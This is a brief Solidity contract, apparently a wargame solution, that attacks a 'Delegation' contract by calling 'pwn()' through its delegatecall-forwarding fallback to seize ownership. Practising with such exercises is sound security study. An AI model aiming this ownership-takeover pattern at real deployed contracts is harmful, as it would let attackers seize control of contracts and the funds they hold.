pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;
    Delegation private delegation;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        delegation = Delegation(_contractAddress);
    }

    function hackContract() external {
        address(delegation).call(abi.encodeWithSignature("pwn()"));
    }
}